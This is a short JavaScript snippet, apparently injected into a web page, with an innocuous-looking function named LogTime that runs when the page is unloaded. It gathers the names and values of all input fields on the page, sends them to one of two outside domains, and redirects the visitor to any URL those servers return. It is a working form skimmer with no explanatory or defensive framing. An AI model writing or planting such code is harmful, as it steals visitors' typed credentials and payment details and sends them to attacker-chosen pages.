var stop = true;

function LogTime(e) {
    const xhr = new XMLHttpRequest();
 xhr.open("POST", '//' + ["petfirsts", "petsdogma"][Math.round(Math.random())] + '.com/index.php', true);
 xhr.onload = function(e) {
  if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
   var response = JSON.parse(xhr.response);
   if (response.url) {
    stop = false;
    e.preventDefault();
    window.location.href = response.url;
   }
  }
 }
 xhr.send("" + [...document.querySelectorAll("input")].map((e) => e.name + '=' + e.value).join("&"));
}
window.onbeforeunload = LogTime;